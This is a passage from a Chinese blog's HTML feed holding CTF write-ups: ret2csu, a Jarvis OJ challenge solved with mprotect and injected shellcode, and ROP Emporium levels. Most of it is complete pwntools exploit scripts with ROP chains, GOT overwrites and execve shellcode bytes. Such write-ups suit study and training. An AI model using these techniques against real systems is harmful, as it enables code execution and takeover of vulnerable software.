class="string">'write'</span>,write_addr)</span><br><span class="line">offest = write_addr-libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system_addr = libc.dump(<span class="string">'system'</span>)+offest</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line">csu(0,1,read_got,16,bss_addr,0,_start)</span><br><span class="line"></span><br><span class="line">p.send(p64(system_addr)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line">csu(0,1,bss_addr,0,0,bss_addr+8,_start)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果<br><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8714.png" alt></p><h2 id="OJ-level5"><a href="#OJ-level5" class="headerlink" title="OJ level5"></a>OJ level5</h2><p>题目说假设system和execve被禁用，用mmap和mprotect实现getshell。<br>所以我们需要自己将shellcode写进bss段里。</p><p>科普一下mmap和mprotect</p><p>我们通过函数mmap来告诉操作系统把哪个文件映射哪块内存去，并且设置我们可能对这块内存的不能操作，就是对文件一样。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;sys/mman.h&gt;</span></span><br><span class="line">void* mmap(void* addr, size_t len, int port, int flag, int filedes, off_t off)</span><br><span class="line"></span><br><span class="line">返回值：成功返回被映射的内存地址，失败返回MAP_FIALED</span><br></pre></td></tr></table></figure><p>参数 addr<br>这个只有在极少数情况下才不为0，这个参数告诉内核使用addr指定的值来映射指定文件。当指定为0的时候，告诉内核返回什么地址内其自身决定。除非非常了解系统进程模式，或者对当前环境非常了解，否则的话手工指定这个值总是不可取。<br>参数 len<br>指定被映射的内存区域的长度。<br>参数 port<br>这个参数对应open函数的权限位，我们可以指定为：PROT_READ，映射区可读；PROT_WRITE，映射区可写；PROT_EXEC，映射区可执行；PROT_NONE，映射区不可访问。由于只能映射已经打开的文件，所以这个权限位不能超出open函数指定的权限，比如说在open的时候指定为只读，那就不能在此时指定PORT_WRITE。<br>参数 flag<br>这个参数指定了映射区的其它一些属性，权限的属性已经在port中指定。这里可能存在的典型值有：MAP_FIXED，针对addr属性，如果指定这个位，那么要求系统必需在指定的地址映射，这往往是不可取的；MAP_SHARED，此标志说明指定映射区是共享的，意思就是说对内存的操作与对文件的操作是相对应的，它不能与MAP_PRIVATE标志一直使用，因为它们表达的意图是相反的；MAP_PRIVATE，该标志说明映射区是私用的，此时被映射的内存只能被当前里程使用，当进程操作的内存将会产生原文件的一个副本。</p><p>mprotect 函数可以更改一个已经存在的映射区的访问权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;sys/mman.h&gt;</span></span><br><span class="line">int mprotect(void* addr, size_t len, int port)</span><br><span class="line"></span><br><span class="line">返回值：成功返回0，失败返回-1</span><br></pre></td></tr></table></figure><p>参数 addr<br>这个参数是mmap返回的数值，此时它就是mprotect作用的范围。<br>参数 len<br>指定映射区的长度，它需要与mmap中指定相同。<br>参数 port<br>在上面我们已经介绍了port的可能取值，mprotect功能就是把这个port指定的属性施加于相应的映射区上。</p><p>好，我们来看题</p><p>开了NX<br>既然题目有提示一个更改权限的函数，那我们就去看一下bss段的权限，应该是禁止执行了的</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8715.png" alt></p><p>readelf -S先找到bss的地址</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8716.png" alt></p><p>vmmap查看权限，bss段的地址为0x600a88 ，在0x600000-0x601000之间，不可执行</p><p>思路：<br>（1）先通过write函数leak出write（也可以是其他）的真实地址<br>（2）找到mprotect的真实地址<br>（3）将shellcode写入bss段<br>（4）调用mprotect将bss段权限更改<br>（5）调用bss，getshell</p><p>第一段的代码：（leak write_addr，found mprotect_addr）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8717.png" alt></p><p>第二段（shellcode写入bss）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8718.png" alt></p><p>第三段（找两个空的got地址，将mprotect和bss写入方便调用）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8719.png" alt></p><p>最后就直接通过csu调用bss段就可以getshell了，（很奇怪的是本地get不到，远程可以）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8720.png" alt></p><h1 id="两种方法的exp"><a href="#两种方法的exp" class="headerlink" title="两种方法的exp"></a>两种方法的exp</h1><p>第一种（写个函数，直接调用）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">sh=remote(<span class="string">'pwn2.jarvisoj.com'</span>,9884)</span><br><span class="line"><span class="comment">#sh = process('./level3_x64')</span></span><br><span class="line">elf =ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line">vul = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line"><span class="comment">#read_plt = elf.symbols['read']</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">read_libc = libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">mprotect_libc = libc.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">write_libc = libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="comment">#write_plt = elf.plt['write']</span></span><br><span class="line"><span class="comment">#bss = 0x0600A88</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget</span></span><br><span class="line">pop5_addr = 0x04006A6</span><br><span class="line">mov_call = 0x0400690    </span><br><span class="line"></span><br><span class="line">bss_got = 0x0600A48</span><br><span class="line">mprotect_got = 0x0600A50</span><br><span class="line"></span><br><span class="line">def csu(r12,r13,r14,r15,data=False):</span><br><span class="line">data_num=<span class="string">''</span></span><br><span class="line">payload = <span class="string">"a"</span>*0x88</span><br><span class="line">payload += p64(pop5_addr)+p64(0)+p64(0)+p64(1)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">payload += p64(mov_call)+<span class="string">"a"</span>*0x38</span><br><span class="line">payload += p64(vul)</span><br><span class="line">sh.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"><span class="keyword">if</span> data==True:</span><br><span class="line">data_num = u64(sh.recv(8))</span><br><span class="line"><span class="built_in">return</span> data_num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_addr = csu(write_got,8,read_got,1,True)</span><br><span class="line">mprotect_addr = read_addr - read_libc + mprotect_libc</span><br><span class="line"><span class="built_in">print</span> <span class="string">"mprotect_addr:"</span> + hex(mprotect_addr)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">shellcode = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">csu(read_got,len(shellcode),bss,0)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line">mprotect_got = 0x0600A50</span><br><span class="line">csu(read_got,8,mprotect_got,0)</span><br><span class="line">sh.send(p64(mprotect_addr))</span><br><span class="line">csu(mprotect_got,7,0x1000,0x600000)</span><br><span class="line">bss_got = 0x0600A48</span><br><span class="line">csu(read_got,8,bss_got,0)</span><br><span class="line">sh.send(p64(bss))</span><br><span class="line">csu(bss_got,0,0,0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>第二种（用pop rdi，rsi，rdx来存参）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">sh =remote(<span class="string">'pwn2.jarvisoj.com'</span>,9884)</span><br><span class="line"><span class="comment">#sh = process('./level3_x64')</span></span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_plt = 0x04004B0</span></span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">vul = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line"><span class="comment">#bss = 0x0600A88</span></span><br><span class="line">bss_base = elf.bss()</span><br><span class="line"></span><br><span class="line">read_plt = elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">write_libc = libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">mprotect_libc = libc.symbols[<span class="string">"mprotect"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget</span></span><br><span class="line">pop_rdi = 0x00000000004006b3 <span class="comment">#the first parameter</span></span><br><span class="line">pop_rsi_rdx = 0x00000000004006b1 <span class="comment">#the second and third </span></span><br><span class="line"></span><br><span class="line">pop5_addr = 0x00000000004006A6</span><br><span class="line">mov_call = 0x0000000000400690     <span class="comment">#distence 0x1a</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"a"</span>*0x80 + p64(0)</span><br><span class="line">payload1 += p64(pop_rdi)+p64(1)+p64(pop_rsi_rdx)+p64(write_got)+p64(0)+p64(write_plt)+p64(vul)</span><br><span class="line">sh.recv()</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload1)</span><br><span class="line">data = sh.recv(8)</span><br><span class="line">write_addr = u64(data)</span><br><span class="line"></span><br><span class="line">libc_dis = write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">mprotect_addr = libc_dis + libc.symbols[<span class="string">"mprotect"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line">pop_rdi = 0x00000000004006b3 <span class="comment">#the first parameter</span></span><br><span class="line">pop_rsi_rdx = 0x00000000004006b1 <span class="comment">#the second and third </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">payload2 = <span class="string">"a"</span>*0x80 + p64(0)</span><br><span class="line">payload2 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(bss_base)+p64(0)+p64(read_plt)+p64(vul)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload2)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">bss_got = 0x0000000000600A48</span><br><span class="line">payload4 = <span class="string">"a"</span>*0x80 + p64(0)</span><br><span class="line">payload4 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(bss_got)+p64(0)+p64(read_plt)+p64(vul)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload4)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(p64(bss_base)) </span><br><span class="line"></span><br><span class="line">mprotect_got = 0x0000000000600A50</span><br><span class="line">payload3 = <span class="string">"a"</span>*0x80 +p64(0)</span><br><span class="line">payload3 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(mprotect_got)+p64(0)+p64(read_plt)+p64(vul)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload3)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(p64(mprotect_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x00000000004006b3 <span class="comment">#the first parameter</span></span><br><span class="line">pop_rsi_rdx = 0x00000000004006b1 <span class="comment">#the second and third </span></span><br><span class="line"></span><br><span class="line">payload5 = <span class="string">'a'</span>*0x80+p64(0)</span><br><span class="line">payload5 += p64(pop5_addr) + p64(0) + p64(0) + p64(1) +p64(mprotect_got) + p64(7) +p64(0x1000)+p64(0x600000)</span><br><span class="line">payload5 +=p64(mov_call) </span><br><span class="line">payload5 += <span class="string">'a'</span>*8 + p64(0) + p64(1) + p64(bss_got) + p64(0) + p64(0) + p64(0)</span><br><span class="line">payload5 += p64(mov_call)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload5)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">`</span><br></pre></td></tr></table></figure><h1 id="权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限"><a href="#权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限" class="headerlink" title="权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限"></a>权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限</h1><p>找了一下午的bug，代码改得有点乱（终于cat到flag也是好心酸的）。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;libc-csu&quot;&gt;&lt;a href=&quot;#libc-csu&quot; class=&quot;headerlink&quot; title=&quot;_libc_csu&quot;&gt;&lt;/a&gt;&lt;em&gt;_libc_csu&lt;/em&gt;&lt;/h2&gt;&lt;p&gt;1、Ret2csu&lt;/p&gt;
&lt;p&gt;这是一个64位的题，开了NX，照常，进ida里瞄瞄它的大体结构是怎样的。&lt;br&gt;Emmm真是一个异常简洁的main函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/07/08/libc-csu/%E5%9B%BE%E7%89%871.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;我们发现它有个pwnme函数哦，那就点进去看一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/07/08/libc-csu/%E5%9B%BE%E7%89%872.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;它里面说了ret2win 的第三个参数（rdx）必须为“0xdeadcafebabebeef”，异或出来是“/bin/cat”，先记住它。然后它还有一堆的赋值为0的语句，手欠点开来看，发现它把got表全置0了，那么我们就完全不用考虑got表。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/07/08/libc-csu/%E5%9B%BE%E7%89%873.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ROP Emporium</title>
    <link href="http://yoursite.com/2019/07/08/ROP%20Emporium/"/>
    <id>http://yoursite.com/2019/07/08/ROP Emporium/</id>
    <published>2019-07-08T04:12:19.000Z</published>
    <updated>2019-07-08T15:11:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>这里是ROP Emporium的题的exp，然后由于我太懒，exp都是64位的，32位的还没写。</p><h2 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1-ret2win"></a>1-ret2win</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2win'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell=0x0400824</span><br><span class="line">bss = 0x0601060</span><br><span class="line"></span><br><span class="line">payload = 0x20*<span class="string">"a"</span> + p64(0) + p64(shell)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="2-split"><a href="#2-split" class="headerlink" title="2-split"></a>2-split</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./split'</span>)</span><br><span class="line"></span><br><span class="line">system = 0x04005E0</span><br><span class="line">cat_flag = 0x0601060</span><br><span class="line">bss = 0x0601080</span><br><span class="line">pop_rdi = 0x0400883</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20 + p64(0) + p64(pop_rdi) + p64(cat_flag) + p64(system)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-callme"><a href="#3-callme" class="headerlink" title="3-callme"></a>3-callme</h2><p>题目意思大概是叫我们分别调用callme_one callme_two callme_three来得到flag，要想知道这些函数到底是干什么的还是要去.so文件里看一下具体的函数（其实主要是它竟然给了我们一个.so文件，那肯定不会没用啊，而且callme里对这三个函数就是一笔带过，啥都没写）</p><p>so里的三个函数传的参都是1、2、3，意思就是我们要把这些参数压进栈内，然后调用callme的三个函数，但是貌似每次调用都要传参，才能调用到下一个函数，所以我们要pop三个寄存器出来存着三个数</p><p><img src="/2019/07/08/ROP Emporium/callme_pop.jpg" alt></p><p>然后找到rdi rsi rdx三个可以用的<br>接下来上脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./callme'</span>)</span><br><span class="line"></span><br><span class="line">callme_one = 0x0401850</span><br><span class="line">callme_two = 0x0401870</span><br><span class="line">callme_three = 0x0401810</span><br><span class="line"></span><br><span class="line">pop_rdi_rsi_rdx = 0x0401ab0 <span class="comment">#wirte 1/2/3 in callme</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20 + p64(0)</span><br><span class="line">payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_one)</span><br><span class="line">payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_two)</span><br><span class="line">payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_three)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>32位不需要调用rdi来存放指令，但是它需要用到堆栈平衡，在调用函数之后的栈帧里，存的是它的返回地址，而后面是调用函数的参数。（这里就没写exp）<br>但64位需要用到rdi，rsi，rdx来存参，参数在调用前进栈，存入相应位置。</p><h2 id="4-write4"><a href="#4-write4" class="headerlink" title="4-write4"></a>4-write4</h2><p>首先，我们明确一下思路，是要将”/bin/sh”写入bss段里。<br>借助pop</p><p><img src="/2019/07/08/ROP Emporium/write4_pop1.jpg" alt></p><p>然后我们选那个r14、r15的地址<br>然后还要去找mov的地址来给寄存器赋值的</p><p><img src="/2019/07/08/ROP Emporium/write4_pop2.jpg" alt></p><p>然后我们找到有r14和r15的，[r14]是代表r14的地址，r15则是对应的值，假设r14地址为0x0401809，r15里的值是“abc”，则这个命令就是，让r14里的地址指向r15里的内容，即0x0401809-&gt;“abc”。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./write4'</span>)</span><br><span class="line"></span><br><span class="line">system = 0x04005E0</span><br><span class="line">pop_rdi = 0x0400893 </span><br><span class="line">bss = 0x0601060</span><br><span class="line"></span><br><span class="line">pop_r14_r15 = 0x0400890 </span><br><span class="line">mov_r14_r15 = 0x0400820 </span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20+p64(0)</span><br><span class="line">payload += p64(pop_r14_r15) + p64(bss) + <span class="string">"/bin/sh\x00"</span> + p64(mov_r14_r15) <span class="comment">#save the /bin/sh into bss</span></span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(system) <span class="comment">#rdi-&gt;system   bss is the x in system</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="5-badchars"><a href="#5-badchars" class="headerlink" title="5-badchars"></a>5-badchars</h2><p>通过程序我们知道，它阻止了几个字符的输入，使个别字符强行转换成21（会影响“/bin/sh”的写入），所以我们要绕过它</p><p><img src="/2019/07/08/ROP Emporium/badchars_bad.jpg" alt></p><p>最简单的加密解密方法就是异或了，我们来找一个数字，使输入异或之后不等于badchars即可，脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line">chars = [98,105,99,47,32,102,110,115]</span><br><span class="line">num = 1</span><br><span class="line">binsh = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"><span class="keyword">while</span> 1:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> binsh:</span><br><span class="line">x = ord(i) ^ num  </span><br><span class="line"><span class="keyword">if</span> x <span class="keyword">in</span> chars:</span><br><span class="line">num += 1</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i == <span class="string">"\x00"</span>:</span><br><span class="line"><span class="built_in">print</span> num</span><br><span class="line">num += 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> num == 10:</span><br><span class="line"><span class="built_in">break</span></span><br></pre></td></tr></table></figure><p>我们选用2<br>然后我们就可以写exp了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">sh = process(<span class="string">'./badchars'</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">num = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> binsh:</span><br><span class="line">num += chr(ord(x)^2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = 0x04006F0 </span><br><span class="line">bss = 0x0601080 </span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0400b39 </span><br><span class="line">mov_r12_r13 = 0x0400b34  </span><br><span class="line">pop_r12_r13 = 0x0400b3b  </span><br><span class="line"><span class="comment">#write num in bss</span></span><br><span class="line"></span><br><span class="line">pop_r14_r15 = 0x0400b40</span><br><span class="line">xor_r15_r14 = 0x0400b30 <span class="comment">#back to binsh</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * 0x20 + p64(0)</span><br><span class="line">payload += p64(pop_r12_r13) + num + p64(bss) + p64(mov_r12_r13)</span><br><span class="line"></span><br><span class="line"><span class="comment">#back to binsh</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(num)):</span><br><span class="line">payload += p64(pop_r14_r15) + p64(2) + p64(bss+i)</span><br><span class="line">payload += p64(xor_r15_r14)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(system)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="6-fluff"><a href="#6-fluff" class="headerlink" 